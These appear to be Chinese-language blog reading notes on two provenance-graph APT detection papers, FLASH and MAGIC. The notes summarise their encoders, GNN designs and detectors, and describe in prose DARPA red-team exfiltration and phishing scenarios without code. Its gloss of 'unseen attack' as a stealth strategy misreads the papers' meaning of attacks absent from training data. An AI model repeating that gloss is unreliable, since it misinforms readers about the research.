我们提供两种方案——选择性图遍历和嵌入回收数据库——使图表示学习在 IDS 设置中变得实用。\n• 我们在真实世界的数据集上对我们的技术进行全面评估。结果突出了FLASH在识别恶意活动方面的有效性，其对对抗性模拟攻击的弹性，以及加速警报验证过程的能力\nMotivation OpTC的攻击场景 攻击者会向目标受害者发送网络钓鱼电子邮件。这些电子邮件包含恶意的 PowerShell Empire 暂存器。打开电子邮件附件后，攻击者将获得对受害者系统的访问权限。然后，攻击代理与命令和控制 （C\u0026amp;C） 服务器建立连接，并秘密地在系统中停留数天。代理的目标是检查系统配置并搜索敏感数据。为了保持隐身性，攻击者执行最少的系统活动并模仿良性系统实体的行为。代理找到所需文件后，会从命令服务器下载有效负载，并将数据泄露到服务器。\n在数据收集过程中，这种特殊的攻击是作为 DAPRA 红队演习的一部分执行的。红队在系统上安装了 C\u0026amp;C 代理，该代理使用find.exe搜索关键文件并收集系统信息。然后，攻击代理通过Chrome.exe从 news.com:8080 下载了一个名为fileTransfer1000.exe的程序。该程序压缩文档目录中的文件并将它们泄露到 news.com:9999。这是数据泄露攻击的典型示例，攻击者旨在从目标系统中窃取敏感信息，同时通过模拟良性系统进程来保持未被发现。\n现有方法缺陷 主要通过学习良性方法\nSemantic Encoding（语义编码)：在节点编码过程中是否考虑了语义信息如进程名称、命令行或文件路径。 Temporal Encoding（时间编码)：是否考虑系统事件的时间顺序 Scalability（可拓展性)：GNN的高计算需求会阻碍系统的可扩展性，是否通过方法降了GNN计算开销 Detection Granularity（检测粒度)：是否有粗细粒度的区分（检测出异常子图、检测出异常节点/边) Contextual Alerts（上下文警报)：按照他原文还是子图粒度和节点/边粒度的问题，他意思是能检测出节点/边的就能更好重建攻击（那为啥要分两条？多少沾点) Robustness Against Mimicry Attacks（对模仿攻击的鲁棒性)：对抗溯源图检测的模仿攻击指操纵分布图编码，修改攻击图中的节点邻域以模仿良性起源图中的节点邻域。归根接地还是要节点粒度/边粒度的检测（嗯是让你凑了三条啊？) FLASH design 五个关键模块组成：\n来源图构造函数 流式读，节点分为进程节点和对象节点，对象节点包括文件、网络流、模块和其他系统对象，节点包含属性，例如进程名称、命令行、文件路径、IP 地址、端口号和模块路径。边带有指定事件类型（系统调用）的标签，标签代表连接节点与事件时间戳之间的因果关系\n基于 Word2Vec 的语义编码器 系统日志包含与各种系统实体相关的丰富属性。独热、词袋转换的向量过于稀疏，采用Word2Vec模型，将属性转换到密集的向量空间。考虑节点的以下属性：进程节点的进程名称和命令行参数、文件节点的文件路径、套接字节点的网络 IP 地址和端口以及模块节点的模块名称。通过结合语义属性和节点与其 1-hop 邻居之间的因果事件类型（系统调用）来为每个节点形成摘要句子。系统事件按时间戳排序，以保持时间顺序。每个句子都通过在良性系统日志上训练的 Word2Vec 模型编码为固定长度的向量。【就是说将节点的属性和对应1hop邻居的系统事件关系形成一个长句子在word2vec到固定长度】 标准的Word2Vec 模型不保留句子中单词的顺序，我们设计了一种为每个单词嵌入分配单独的权重的时间编码方案，为每个单词嵌入分配单独的权重。这些权重累积在一个句子上，产生一个富含时间信息的嵌入。我们通过根据时间戳按时间顺序排列系统事件来启动这种方法，从而促进将时间顺序整合到我们的句子中。我们将从Transformers[65]借来的概念位置编码合并到输入嵌入中，以传达有关序列中每个标记位置的信息。Word2Vec 缺乏内置的顺序概念，因此位置编码允许模型根据其序列位置来区分标记。 通过将Word2Vec嵌入与位置编码相结合，我们的模型不仅可以捕获单词之间的语义关联，还可以捕获摘要句子中单词的顺序。\n基于 GNN 的上下文编码器 通过GNN需要通过对节点周围k-hop邻域结构进行编码可以有效识别溯源图中的隐蔽攻击节点，但开销巨大。基于上一部分的word2vec的嵌入的图表示学习则加雪上加霜。 我们的GNN模型学习GraphSage的图遍历算法。我们设计了一系列图遍历原则。这些原则指导GraphSage在应用GNN之前有选择地聚合来自特定边缘的信息。我们用以下遍历原则：\n唯一边采样：我们仅对两个节点之间相同类型的单个边进行采样，确保在遍历过程中只包含一次此类边。【不还是图缩减吗……说的好像很屌的样子】 低优先级事件排除：排除事件优先级的边和取证无关的系统事件的边。此类事件可能包括由进程临时创建且在系统执行期间从未与其他进程交互的文件的删除事件，以及表示为进程节点的自循环的退出事件。以前的工作也采用了类似的方法来减少系统日志中的噪声。 特定于执行的信息过滤：仅包含一次具有相同执行特定信息的节点和边。溯源图中的许多相邻节点可能仅因特定于执行的属性而有所不同，但在其他方面是相同的。比如具有相同4元组但开始和结束时间不同的网络流 用户特定属性处理：将仅在用户特定属性上不同的节点或边视为相同，例如，如果两个模块具有相同的模块路径，但不同的用户ID不同，则它们可能会有所不同。对于此类节点，我们忽略特定于用户的属性，仅选择其中一个。 我们采用半监督节点分类方法来训练我们的新GNN模型。我们的模型使用节点的输入特征和图形结构来对其类型进行分类。GNN模型使用标记数据进行训练，学习识别良性节点的类型【你他妈不还是学的良性吗？你在这说什么p话呢？】。使用加权交叉熵来解决数据不平衡的问题，\n嵌入数据库 我们的系统利用训练好的图神经网络（GNN）模型为存在于我们良性数据集中的所有节点生成结构化嵌入。为了在实时威胁检测期间高效检索和存储这些GNN输出向量，我们设计了一个专门的键值存储结构。键被设计为持久节点标识符（PNI），它与节点属性相关联，这些属性在不同的系统执行过程中保持不变。这些属性包括进程名称、文件路径、模块路径和网络流IP地址。相应的值则包含了由GNN导出的嵌入，以及与该特定节点相关联的一组邻居节点。 我们利用属性抽象技术来删除特定于用户和执行的信息。这确保了存储的嵌入是可通用的。具体来说，有以下几种抽象模式\n用户抽象模式：针对进程和文件节点类型实现，该模式从进程名称和文件路径中省略用户ID，实现高度泛化。例如，文件路径 /Users/john/.bashrc 被抽象为 /Users/*/.bashrc。 网络连接抽象架构：应用于套接字节点类型，此架构消除了开始和结束时间，从而增强了不同系统执行的通用性 模块路径抽象架构：模块节点具有路径和基址属性。当基址更改时，路径在不同的执行中保持不变。此架构仅保留模块路径，确保模块节点的一致和可泛化表示。 通过对具有稳定邻域结构的节点进行预计算和存储GNN嵌入，可以优化实时异常检测和减少计算开销。其中，邻域集起着关键作用。它有助于确定实时分析期间节点的邻域结构是否与良性阶段观察到的邻域结构相匹配。如果匹配就直接拿数据库里的嵌入，不需要再通过邻域关系进行图表示计算。如果不匹配则默认为实时生成的 Word2Vec 特征进行异常检测。【Q：对吗？是特征？不是应该是GNN算出来的节点嵌入吗？】我们使用 Jaccard 索引来比较节点的存储邻域和当前邻域。\n异常检测器 我们选择了 XGBoost 作为我们的异常检测任务的分类器。XGBoost 最小化正则化目标函数 $J = L(y， f (x))+Ω(f)$，使用梯度提升以迭代方式向集合添加新树。每个新树都旨在最小化损失函数相对于当前集成预测的梯度。XGBoost 模型使用每个节点的串联 Word2Vec 编码向量和 GNN 嵌入向量。它从预训练的键值存储中检索 GNN 嵌入，实时生成 Word2Vec 特征，执行推理，并保存输出以供下一管道阶段使用。这种强大的流程巩固了我们IDS的性能和可扩展性。 FLASH通过比较预测节点类型和实际节点类型来检测异常节点。\n还有个攻击演化图的构造，用于更直观的溯源\n从FLASH生成的大型来源图和警报中构建紧凑的攻击演化图（AEG）。中心概念是在来源图中相互链接因果相关的警报，从而构建一系列简洁的 AEG。这些 AEG 仅封装警报节点及其因果链接，从而提供警报节点交互的简化和清晰视图。这种减少大大简化了原始图形，使分析师更容易快速有效地掌握攻击进展。 Evaluation 懒得写了\n主要贡献 嵌入回收数据库存储在训练阶段生成的节点嵌入\n通过图神经网络（GNN）在数据溯源图上利用图表示学习 使用基于Word2Vec的语义编码器来捕获基本的语义属性和时间顺序 采用了基于GNN的上下文编码器，可以有效地将局部和全局图结构编码为富有表现力的节点嵌入。 补充知识 加权交叉熵 加权交叉熵（Weighted Cross-Entropy）是一种改进的交叉熵损失函数，它通过为不同类别的样本分配不同的权重来调整损失的计算。在标准的交叉熵损失函数中，所有类别的样本对损失的贡献是相同的。然而，在实际应用中，数据集往往存在类别不平衡的问题，即某些类别的样本数量远多于其他类别。这种不平衡会导致模型在训练时偏向于预测样本数量多的类别，从而忽视了样本数量少的类别。\n加权交叉熵通过引入权重系数来解决这个问题。对于样本数量较少的类别，可以为其分配一个较大的权重，而对于样本数量较多的类别，则分配一个较小的权重。这样，在计算损失时，样本数量少的类别对损失的贡献会更大，从而促使模型更加关注这些类别的样本，提高模型对这些类别的预测能力。\nJaccard 索引 Jaccard 索引，也称为 Jaccard 相似系数或 Jaccard 系数，是一种衡量两个集合相似度的统计量。它定义为两个集合的交集大小与它们的并集大小的比值。Jaccard 索引的取值范围在 0 到 1 之间，其中 1 表示两个集合完全相同，0 表示两个集合没有共同元素。\nJaccard 索引的数学表达式如下：\nJ(A, B) = |A ∩ B| / |A ∪ B|\nXGBoost XGBoost（eXtreme Gradient Boosting）是一种基于决策树的集成机器学习算法，它以梯度提升（Gradient Boosting）框架为基础，通过优化目标函数和高效地处理大规模数据集而广受欢迎\nXGBoost 在各种机器学习任务中都有广泛的应用，如分类、回归、排序等。由于其优异的性能和灵活性，XGBoost 成为了数据科学家和机器学习工程师的常用工具之一。\nXGBoost有以下优点：\nXGBoost 在传统的梯度提升框架基础上，引入了一个正则化项，用于控制模型的复杂度，从而减少过拟合的风险。这使得 XGBoost 在训练过程中能够生成更加稳健和泛化能力更强的模型。 XGBoost 采用了一些优化技巧，如近似算法、特征分位点、缓存优化等，以提高算法的计算效率。这使得 XGBoost 能够处理大规模数据集，并在较短的时间内完成训练。 XGBoost 提供了丰富的参数设置，用户可以根据具体问题的需求调整模型的性能。这些参数包括树的深度、学习率、子采样比例等，通过合理地设置这些参数，可以进一步提高模型的性能。 XGBoost 可以处理多种类型的数据，包括数值型、类别型和缺失值等。这使得 XGBoost 在实际应用中具有很高的灵活性 XGBoost 支持在多线程环境下进行并行计算，以及在分布式系统中进行计算，这使得 XGBoost 能够处理更大规模的数据集，并在更短的时间内完成训练。 我的评价 感觉没啥特别的，就一个嵌入数据库比较有意思，抽空把嵌入回收那篇的原文读了吧。\n学到了用加权交叉熵来解决数据不平衡，但是我觉得KAIROS的欠采样和过采样更好一点。\n剩下的图缩减的优化算法其实感觉也都大差不差，都是尽可能缩就完了……\n","date":"2024-04-18T10:51:57+08:00","image":"http://localhost:1313/p/flash/index/1716374966746_hu1665865493602814790.png","permalink":"http://localhost:1313/p/flash/","title":"FLASH"},{"content":"文章可以在这里获取\nAbstract APT攻击越来越成为普遍的威胁，然而，以前的工作表现出几个缺点：\n需要包含攻击的数据和APT的先验知识 无法提取隐藏在来源图中的丰富上下文信息 由于其令人望而却步的计算开销和内存消耗而变得不切实际。 本文介绍一种自监督APT检测方法MAGIC，能够在不同级别的监督下进行多粒度检测。利用掩码图表示学习对良性系统实体和行为进行建模，对来源图进行高效的深度特征提取和结构抽象。通过异常值检测方法检测异常系统行为，MAGIC 能够执行系统实体级和批处理日志级 APT 检测。\nMAGIC是专门为处理概念漂移而设计的，具有模型适配机制，并成功应用于通用条件和检测场景。我们在三个广泛使用的数据集上评估了MAGIC，包括真实世界和模拟攻击。评估结果表明，MAGIC在所有场景中都取得了令人鼓舞的检测结果，并且在性能开销方面比最先进的APT检测方法具有巨大的优势。\nIntroduction 高级持续性威胁（APTs）是由熟练的攻击者进行的蓄意和复杂的网络攻击，对企业和机构都构成巨大威胁。大多数 APT 都涉及零日漏洞，并且由于其隐蔽性和多变性而特别难以检测。\n最近关于APT检测的工作利用数据来源进行APT检测。数据来源将审计日志转换为来源图，从审计日志中提取丰富的上下文信息，为细粒度的因果关系分析和 APT 检测提供完美的平台。\n早期工作基于典型或特定的 APT 模式构建规则，并将审计日志与这些规则进行匹配，以检测潜在的 APT。\n最近的一些工作采用统计异常检测方法来检测APT，这些APT侧重于不同的来源图元素，例如系统实体、交互和社区。\n最近的研究基于深度学习的方法。他们利用各种深度学习 （DL） 技术对 APT 模式或系统行为进行建模，并以分类或异常检测方式执行 APT 检测。\n虽然这些现有方法已经证明了它们能够以合理的准确性检测 APT，但它们遇到了以下挑战的各种组合：\n监督方法存在缺乏数据 （LOD） 问题，因为它们需要有关 APT 的先验知识（即攻击模式或包含攻击的日志）。此外，当面对他们没有接受过处理培训的新型 APT 时，这些方法特别容易受到攻击。 基于统计的方法只需要良性数据即可发挥作用，但无法提取审计日志中埋藏的复杂良性活动的深层语义和相关性，导致误报率高。 基于深度学习的方法，特别是基于序列和基于图的方法，以沉重的计算开销为代价，取得了可观的有效性，使其在实际检测场景中不切实际 在本文中，我们通过引入MAGIC来解决上述三个问题，MAGIC是一种新颖的自监督APT检测方法，它利用掩码图表示学习和简单的异常值检测方法从海量审计日志中识别关键攻击系统实体。MAGIC首先通过简单而通用的步骤从审计日志中构建出处图。然后，MAGIC使用图表示模块，该模块通过以自我监督的方式合并图特征和结构信息来获得嵌入。该模型建立在图形掩蔽自编码器[19]之上，在掩蔽特征重建和基于样本的结构重建的共同监督下。采用无监督异常值检测方法对计算出的嵌入进行分析，并得到最终的检测结果。\nMAGIC首先通过简单而通用的步骤从审计日志中构建出处图。然后，MAGIC使用图表示模块，该模块通过以自我监督的方式合并图特征和结构信息来获得嵌入。该模型建立在图形掩蔽自编码器之上，在掩蔽特征重建和基于样本的结构重建的共同监督下。采用无监督异常值检测方法对计算出的嵌入进行分析，并得到最终的检测结果。\nMAGIC 旨在灵活且可扩展。根据应用程序背景，MAGIC 能够执行多粒度检测，即检测批处理日志中是否存在 APT 或定位实体级对手。虽然 MAGIC 旨在执行 APT 检测而不会受到攻击包含数据，但它非常适合半监督和完全监督的情况。此外，MAGIC还包含一个可选的模型适配机制，为其用户提供反馈渠道。这样的反馈对于MAGIC进一步提高性能、对抗概念漂移和减少误报非常重要。\n我们在三个不同的 APT 攻击数据集上评估了MAGIC的性能和开销：DARPA Transparent Computing E3 数据集、StreamSpot 数据集和 Unicorn Wget 数据集。DARPA 数据集包含真实世界的攻击，而 StreamSpot 和 Unicorn Wget 数据集则在受控环境中完全模拟。评估结果表明，MAGIC 能够以 97.26% 的准确率和 99.91% 的召回率执行实体级 APT 检测，并且开销最小，对内存的要求更低，并且比最先进的方法快得多\ncontribution总结\n提出了MAGIC，这是一种基于掩码图表示学习和异常值检测方法的通用APT检测方法，能够对海量审计日志进行多粒度检测。 通过扩展的图形掩码自动编码器将计算开销降至最低，从而确保 MAGIC 的实用性，即使在狭小的条件下，也能在可接受的时间内完成训练和检测。 通过各种努力确保MAGIC的普遍性。我们利用掩码图表示学习和异常值检测方法，使 MAGIC 能够在不同的监管级别、不同的检测粒度和来自不同来源的审计日志下进行精确检测。 在三个广泛使用的数据集上评估了 MAGIC，涉及真实世界和模拟的 APT 攻击。评估结果表明，MAGIC检测的APTs具有良好的结果和最小的计算开销。 提供 MAGIC 的开源实现，以造福社区未来的研究，并鼓励进一步改进我们的方法。 Background 攻击场景 在这里，我们提供了我们在整篇文章中使用的 APT 场景的详细说明。带有 Drakon Dropper 的 Pine 后门是来自 DARPA Engagement 3 Trace 数据集的 APT 攻击 [20]。在攻击过程中，攻击者构建恶意可执行文件 （/tmp/tcexec） 并通过网络钓鱼电子邮件将其发送到目标主机。然后，用户会无意识地下载并打开电子邮件。电子邮件中包含的可执行文件旨在执行用于内部侦测的端口扫描，并在目标主机和攻击者之间建立静默连接。\n图 1 显示了我们的动机示例的出处图。图中的节点表示系统实体，箭头表示实体之间的定向交互。显示的图是通过删除大多数与攻击无关的实体和交互，从完整的来源图中抽象出来的子图。不同的节点形状对应不同类型的实体。被条纹覆盖的实体被视为恶意实体。\nPrior Research and their Limitations 监督方法：对于早期作品，需要构建特殊的启发式规则来涵盖所有攻击模式。许多基于深度学习的APT检测方法基于良性和攻击性数据构建来源图，并以分类方式检测APT。这些监督方法可以在学习的攻击模式上获得近乎完美的检测结果，但在面临概念漂移或看不见的攻击模式时尤其容易受到攻击。此外，对于基于规则的方法，启发式规则的构建和维护可能非常昂贵和耗时。对于基于深度学习的方法，包含攻击的数据的稀缺性阻碍了这些监督方法的实际部署。针对上述问题，MAGIC 采用完全自监督的异常检测方式，在有效处理不可见攻击模式的同时，允许不存在包含攻击的数据。 基于统计的方法：最新的基于统计学的方法通过识别系统实体、交互和社区的稀有性或异常分数来检测APT信号。然而，系统实体的稀有性并不一定表明它们的异常，通过因果分析或标签传播获得的异常评分是来源图上的浅层特征提取。为了说明这一点，在我们的攻击示例中，进程 tcexec 对不同的 IP 地址执行多个端口扫描操作（参见图 1），这可以被视为正常的系统行为。但是，考虑到源自外部网络的进程 tcexec 也会读取敏感的系统信息 （uname） 并与公共 IP 地址 （162.66.239.75） 建立连接，我们可以很容易地将 tcexec 识别为恶意实体。由于无法提取系统实体之间的深层语义和相关性，通常会导致基于统计的方法检测性能低下和误报率高。然而，MAGIC采用图表示模块对来源图进行深度图特征提取，从而产生高质量的嵌入。 基于 DL 的方法：最近，基于DL的APT检测方法，无论是有监督还是无监督，都产生了非常有希望的检测结果。然而，在现实中，中型企业每天会产生数百GB的审计日志。因此，基于深度学习的方法，特别是基于序列的和基于图形的方法，由于其计算开销而不可行。例如，ATLAS平均需要 1 小时才能在 676MB 的审计日志上进行训练，而 ShadeWatcher在具有 GPU 的 DARPA E3 Trace 数据集上训练平均需要 1 天。此外，一些基于图自编码器的方法在来源图规模扩大时会遇到爆炸性内存开销问题。MAGIC 通过引入图形掩码自动编码器避免了计算要求高，并在短短几分钟内完成了对 DARPA E3 Trace 数据集的训练。第 6.4 节中详细介绍了 MAGIC 的性能开销。 端到端方法：除了上面讨论的三个主要局限性之外，还值得一提的是，最新的APT检测方法是端到端检测器，并且专注于一个特定的检测任务。例如，ATLAS专注于端到端的攻击重建，而 Unicorn则从流日志中生成系统级警报。相反，MAGIC的方法是通用的，可以在各种检测场景下执行多粒度APT检测，也可以应用于从不同来源收集的审计日志。（什么叫通用的？预训练精调？还是知识说能检测多场景多力度就算通用了？） Threat Model and Definitions 威胁模型：我们假设攻击者来自系统外部，并以系统内的有价值信息为目标。攻击者可能会执行复杂的步骤来实现其目标，但在日志中留下可追踪的证据。系统硬件、操作系统和系统审计软件的组合是我们值得信赖的计算基础。在我们的威胁模型中不考虑毒物攻击和逃避攻击。\n出处图：来源图是从原始审计日志中提取的有向循环图。构建来源图是数据来源的常见做法，因为它连接系统实体并呈现它们之间的交互关系。来源图包含代表不同系统实体（例如，进程、文件和套接字）的节点，以及代表系统实体之间交互（例如，执行和连接）的边缘，并标有它们的类型。例如，/tmp/tcexec 是一个 FileObject 系统实体，而 /tmp/tcexec 和 tcexec 之间的边缘是 FileObject 面向 Process 的执行操作（参见图 1）。\n多粒度检测：MAGIC 能够执行两个粒度的 APT 检测：批处理日志级别和系统实体级别。MAGIC的多粒度检测能力催生了两阶段检测方法：首先对流式日志进行批量日志级检测，然后对正批次进行系统实体级检测，以识别详细的检测结果。将这种方法应用于实际环境将有效减少工作量、资源消耗和误报，同时产生详细的结果。\n批处理日志级别检测。在这种粒度的 APT 检测下，主要任务是给定来自一致来源的批量审核日志，如果在一批日志中检测到潜在的 APT，MAGIC 会发出警报。与Unicorn类似，MAGIC无法在这种检测粒度下准确定位恶意系统实体和交互。 系统实体级检测。在这种粒度的APT检测下，检测任务是给定来自一致来源的审计日志，MAGIC能够在这些审计日志中准确定位恶意系统实体。在APT期间识别关键系统实体对于后续任务（如攻击调查和攻击故事恢复）至关重要，因为它提供了可解释的检测结果，并减少了对领域专家的需求以及冗余的手动工作。 MAGIC是一种新型的自监督APT检测方法，它利用掩蔽图表示学习和异常值检测方法，能够对海量审计日志进行高效的多粒度检测。MAGIC的流水线由三个主要组件组成：（1）来源图构建，（2）图表示模块和（3）检测模块。它还提供了可选的 （4） 模型适配机制。在训练过程中，MAGIC 用 （1） 转换训练数据，用 （2） 学习图嵌入，用 （3） 记住良性行为。在推理过程中，MAGIC 使用 （1） 转换目标数据，使用训练的 （2） 获得图形嵌入，并通过 （3） 检测异常值。图 2 概述了 MAGIC 架构。\n系统审计软件收集的流式审计日志通常以批量方式存储。在来源图构建 （1） 期间，MAGIC 将这些日志转换为静态来源图。系统实体及其之间的交互被提取并分别转换为节点和边。使用几种降低复杂性的技术来删除冗余信息。 然后，将构建的出处图通过图表示模块（2）馈送，以获得输出嵌入（即对象的综合向量表示）。图表示模块基于图屏蔽自动编码器构建，并集成了基于样本的结构重构，将节点和边属性嵌入、传播和聚合到输出嵌入中，这些嵌入包含节点嵌入和系统状态嵌入。图形表示模块仅使用良性审核日志进行训练，以对良性系统行为进行建模。在对可能包含攻击的审计日志执行 APT 检测时，MAGIC 利用基于输出嵌入的异常值检测方法来检测系统行为中的异常值 （3）。根据任务的粒度，使用不同的嵌入来完成 APT 检测。在批处理日志级任务中，反映整个系统一般行为的系统状态嵌入是检测目标。此类嵌入中的异常值意味着其相应的系统状态是看不见的，并且可能是恶意的，这会显示该批次中的 APT 信号。在系统实体级任务中，检测目标是那些节点嵌入，它们表示系统实体的行为。节点嵌入中的异常值表示可疑的系统实体，并以更精细的粒度检测 APT 威胁。\n在实际检测设置中，MAGIC 有两个预先设计的应用程序。对于系统审计软件收集的每批日志，可以直接利用MAGIC的实体级检测来准确识别批次中的恶意实体，也可以按照第2.3节的规定进行两阶段检测。在这种情况下，MAGIC 首先扫描批次并查看批次中是否存在恶意信号（批处理日志级别检测）。如果警报为阳性，则 MAGIC 将执行实体级检测，以更精细的粒度识别恶意系统实体。与实体级检测相比，批量日志级别检测的计算要求要低得多。因此，这样的两阶段例程可以帮助MAGIC的用户节省计算资源，避免误报，同时不影响MAGIC的检测细度。但是，如果用户喜欢对所有系统实体进行细粒度检测，则前一个例程仍然是一个可访问的选项。\n为了应对概念漂移和看不见的攻击（unseen attack），采用了可选的模型适配机制为其用户提供反馈渠道（4）。由安全分析师检查和确认的检测结果将反馈给 MAGIC，帮助其以半监督的方式适应良性系统行为变化。在这种情况下，MAGIC获得了更有希望的检测结果，这将在第6.3节中讨论。此外，MAGIC 可以很容易地应用于现实世界的在线 APT 检测，这要归功于它能够适应概念漂移和最小的计算开销。\n1用的啥？2用的基于图屏蔽自动编码器，3用的啥？KNN? （4）是干啥的？\n（4）是靠人工标注进行监督学习的。\nunseen attack \u0026ldquo;Unseen attack\u0026rdquo;（不可见攻击）是一种高级持续性威胁（Advanced Persistent Threat，APT）攻击中的一种策略。这种攻击手段的目标是使攻击者的活动对受害者尽可能地不可见，让受害者很难察觉到自己受到了攻击。\n这种类型的攻击通常采取了多种隐蔽的方法，旨在规避传统安全监控和检测工具的检测。一些常见的不可见攻击技术包括：\n无文件攻击（Fileless Attacks）：这种攻击方式不会在受害者系统上留下可被传统防病毒软件等检测到的文件。攻击者通过利用系统内置的工具或脚本语言，例如 PowerShell 或 WMI (Windows Management Instrumentation)，在内存中执行恶意代码。 隐蔽通信：攻击者会使用加密或隐藏的通信渠道，以避免被网络监控和入侵检测系统检测到。这可能包括使用加密协议、隐蔽通信端口或者隐藏在合法网络流量中的恶意数据。 低频攻击：攻击者会在较长时间间隔内执行活动，以减少被检测到的风险。这种攻击方式通常不会引起系统管理员的注意，因为攻击活动没有频繁发生。 持续访问：攻击者在成功进入受害者网络后，会尽可能长时间地保持对系统的访问，以获取更多的信息和权限。他们可能会隐藏在系统的深层次，并悄悄地窃取数据或监视受害者的活动。 动态改变攻击模式：攻击者会不断地改变他们的攻击方式和工具，以规避传统的安全防御措施。这种变化性可以使传统的签名检测和规则检测方法失效。 Design Details Provenance Graph Construction MAGIC 首先从原始审计日志中构建出处图，然后再执行图表示和 APT 检测。我们遵循三个步骤来构建一致且优化的来源图，为图表示做好准备。\n日志解析：第一步是简单地解析每个日志条目，提取系统实体以及它们之间的系统交互。然后，可以构建一个原型出处图，以系统实体为节点，以交互为边。现在，我们提取有关节点和边的分类信息。对于提供实体和交互标签的简单日志格式，我们直接使用这些标签。对于提供这些实体和交互的复杂属性的某种格式，我们应用多标签哈希（例如，xxhash）将属性转换为标签。在这个阶段，来源图是有向多图。我们设计了一个示例来演示如何处理图 3 中日志解析后的原始来源图。\n初始嵌入：在这个阶段，我们将节点和边标签转换为维度 d 的固定大小的特征向量（即初始嵌入），其中 d 是图表示模块的隐藏维度。我们应用了查找嵌入，在节点/边标签和 d 维特征向量之间建立了一对一的映射。如图 3（I 和 II）所示，进程 a 和 b 共享相同的标签，因此它们映射到相同的特征向量，而 a 和 c 嵌入到不同的特征向量中，因为它们具有不同的标签。我们注意到，唯一节点/边缘标签的可能数量由数据源（即审计日志格式）决定。因此，查找嵌入在转导设置下工作，不需要学习看不见的标签的嵌入。\n降噪：我们的图表示模块的预期输入出处图将是简单图。因此，我们需要在节点对之间组合多个边。如果一对节点之间存在同一标签的多个边（也共享相同的初始嵌入），我们将删除多余的边，以便只保留其中一条。然后，我们将剩余的边合并为一条最终边。我们注意到，在一对节点之间，可能会保留几个不同标签的边缘。组合后，通过对剩余边的初始嵌入进行平均来获得所得唯一边的初始嵌入。为了说明这一点，我们在图3（II和III）中展示了我们的降噪如何结合多边，以及它如何影响边的初始嵌入。首先，对于每个标签，将 a 和 c 之间的 3 次读取和 2 次写入交互合并为一个。然后我们将它们组合在一起，形成一个边缘 eac，其初始嵌入等于其余边缘的平均初始嵌入（e′ 2 和 e′ 5）。我们在附录E中提供了我们的降噪步骤与以前工作的比较\n简单来说就是先对边和节点进行多标签哈希，目的是将多个类别标签映射到设计的那几个标签上（如果是有标签的日志格式则不需要这一步），这样每个边都有标签，标签就是边的含义（read,write等)。然后将节点和标签转为d维的初始嵌入，再将节点对之间嵌入值相同的边合并成一个边。\nGraph Representation Module MAGIC 采用图表示模块从特色出处图（featured provenance graphs）中获取高质量的嵌入。如图 4 所示，图表示模块由三个阶段组成：用于部分隐藏节点特征（即初始嵌入）以进行重建的掩码过程，通过传播和聚合图特征生成节点和系统状态输出嵌入的图编码器，图解码器通过掩码特征重建和基于样本的结构为图表示模块的训练提供监督信号重建。编码器和解码器形成图形掩码自动编码器，在生成快速且节省资源的嵌入方面表现出色。\nFeature Masking 在训练我们的图表示模块之前，我们对节点执行掩码，以便在重建这些节点时可以训练图掩码自动编码器。屏蔽节点是随机选择的，覆盖所有节点的一定比例。此类屏蔽节点的初始嵌入将替换为特殊的屏蔽令牌 xmask，以涵盖有关这些节点的任何原始信息。但是，边缘不会被屏蔽，因为这些边缘提供了有关系统实体之间关系的宝贵信息。总之，给定节点初始嵌入 $x_n$，我们按如下方式屏蔽节点：\n其中 $\\tilde{N}$ 是随机选择的掩码节点，$emb_n$ 是节点 n 的嵌入，准备训练图表示模块。此掩蔽过程仅在训练期间发生。在检测过程中，我们不会屏蔽任何节点。\nGraph Encoder 从图构建步骤中获得的初始嵌入仅考虑原始特征。然而，原始特征还远远不足以对系统实体的详细行为进行建模。实体的上下文信息，如其邻域、多跳关系以及与其他系统实体的交互模式，对于获得高质量的实体嵌入起着重要作用。在这里，我们采用并扩展了图形屏蔽自编码器，以自监督的方式生成输出嵌入。图形屏蔽自动编码器由编码器和解码器组成。编码器通过传播和聚合图特征来生成输出嵌入，解码器重建图特征以提供用于训练的监督信号。这种编码器-解码器架构在生成的嵌入中保留了上下文和语义信息，同时通过掩蔽学习显着降低了其计算开销。\n我们的图表示模块的编码器包含多个堆叠层的图注意力网络（GAT）。GAT层的功能是根据节点本身及其相邻节点的特征（初始嵌入）生成输出节点嵌入。与普通的GNN不同，GAT引入了一种注意力机制来衡量这些邻居的重要性。【GAT加了attention真的还好算吗？训练代价应该也不小吧】\n为了详细解释，GAT 的一层将前几层生成的节点嵌入作为输入，并将嵌入从源节点传播到目标节点，并沿交互传播到消息中。该消息包含有关源节点以及源节点和目标节点之间交互的信息：\n并采用注意力机制来计算消息源与其目的地之间的注意力系数：\n然后，对于目标节点，GAT 聚合来自传入边缘的消息，以通过计算所有传入消息的加权和来更新其节点嵌入。权重正是注意力系数：\n其中 $h^l_n$ 是 GAT 第 l 层节点 n 的隐藏嵌入，$h^{l-1}_n$ 是 l − 1 层的隐藏嵌入，$\\mathcal{N}_n$ 是 n 的单跳邻域。第一个 GAT 层的输入是初始节点嵌入。Embe 是初始边缘嵌入，在整个图形表示模块中保持不变。$W_as$，$W_am$，$W_{self}$ ，$W{msg}$ 是可训练的参数。更新的节点嵌入构成了节点单跳交互行为的一般抽象。\n将此类 GAT 的多层堆叠以获得最终的节点嵌入 h，该节点嵌入由原始节点嵌入和所有 GAT 层的输出连接起来：\n其中 ·||·表示串联操作。GAT堆叠的层数越多，相邻范围就越宽，节点的多跳交互模式能够表示的就越远。因此，图编码器有效地结合了节点初始特征和多跳交互行为，将系统实体行为抽象到节点嵌入中。图编码器还对所有节点嵌入应用平均池化，以生成图本身的全面嵌入，它概括了系统的整体状态：\n图编码器生成的节点嵌入和系统状态嵌入被视为图表示模块的输出，用于不同场景下的后续任务。\nGraph Decoder 图形编码器不提供支持模型训练的监督信号。在典型的图自编码器中，使用图解码器对节点嵌入进行解码，并通过特征重构和结构重构来监督模型训练。然而，图形屏蔽自编码器放弃了结构重建，以减少计算开销。我们的图解码器是两者的混合体，它集成了掩码特征重建和基于样本的结构重建，以构建优化图表示模块的目标函数。\n给定从图编码器获得的节点嵌入 $h_n$，解码器首先重新屏蔽这些屏蔽节点，并将它们转换为屏蔽特征重建的输入：\n随后，解码器使用上述类似的GAT层来重建掩码节点的初始嵌入，从而可以计算特征重建损失：\n【所以这个掩码节点是拿个seed全局保留的马？】\n其中 $L_{fr} 